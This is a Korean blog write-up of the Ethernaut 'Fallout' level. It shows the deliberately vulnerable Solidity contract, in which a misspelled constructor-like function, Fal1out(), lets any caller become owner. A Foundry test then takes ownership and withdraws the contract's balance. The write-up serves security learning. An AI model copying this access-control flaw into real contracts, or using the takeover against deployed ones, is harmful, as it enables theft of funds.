---
title: "Ethernaut Fallout"
date : 2026-11-14 00:00:00 +0900
categories: [Blockchain Security, Ethernaut ]
tags: [solidity, smart-contract, access-control, fallback, foundry]
---


## Fallout

Foundary 버전 오류로 코드를 조금 수정했다.

```solidity

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Fallout {
    mapping(address => uint256) allocations;
    address payable public owner;

    function Fal1out() public payable {
        owner = payable(msg.sender);        // 0.8: msg.sender는 address라 payable 캐스팅 필요
        allocations[owner] = msg.value;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function allocate() public payable {
        allocations[msg.sender] += msg.value;   // SafeMath .add 대신 +
    }

    function sendAllocation(address payable allocator) public {
        require(allocations[allocator] > 0);
        allocator.transfer(allocations[allocator]);
    }

    function collectAllocations() public onlyOwner {
        payable(msg.sender).transfer(address(this).balance);  // 0.8: payable 캐스팅
    }

    function allocatorBalance(address allocator) public view returns (uint256) {
        return allocations[allocator];
    }
}

 ```

 collectAllocations 를 호출하면 msg.sender로 이 컨트랙트의 잔고 모두를 전송할수있다.


 ## 분석

 Fal1out()함수에서 호춯한 사람을 그냥 owner로 지정해주고있다.
 그냥 호출한다음 collectAllocations를 호출하면 자동으로 넘어가진다.

 ## exploit

 ``` solidity 
 
 pragma solidity ^0.8.0;

import "forge-std/Test.sol"; //Foundry test 도구 
import "../src/Fallout.sol"; //공격대상 가져오기

contract FalloutAttack is Test{
    
    Fallout fallout;
    address attacker = makeAddr("attacker"); //공격자 주소 생성

    function setUp() public{
        fallout = new Fallout();
    }

    function test_takeOwnership() public{
        vm.startPrank(attacker);

        fallout.Fal1out{value : 0 ether}();
        fallout.collectAllocations();
        assertEq(fallout.owner(), attacker);

        vm.stopPrank();
    }
}
 
 ```